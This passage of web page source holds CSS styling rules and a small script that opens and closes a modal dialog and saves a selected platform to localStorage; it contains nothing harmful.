    display: flex;
    color: inherit;
    justify-content: space-evenly;
    align-items: center;
      }
  
      /* sc-component-id: pageStyles__SFootNote-sc-1navawn-8 */
      .ceWocr {
        margin: 10px;
        color: rgb(88, 112, 135);
        opacity: 0.75;
        padding-top: 30px;
      }
  
      .ceWocr a {
        font-weight: 600;
      }
    </style>
    
    <script>

export default {
  data() {
 
  },
  components: {
   
  },
  methods: {
    clickModal(platform){
    localStorage.setItem("platform", JSON.stringify(platform))
      this.platform = platform;
      // Get the modal
      var modal = document.getElementById("myModal");
       modal.style.display = "block";
    },
    closeModal(){
      var modal = document.getElementById("myModal");
       modal.style.display = "none";
    }
  },
};
window.onclick = function(event) {
  var modal = document.getElementById("myModal");
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
</script>
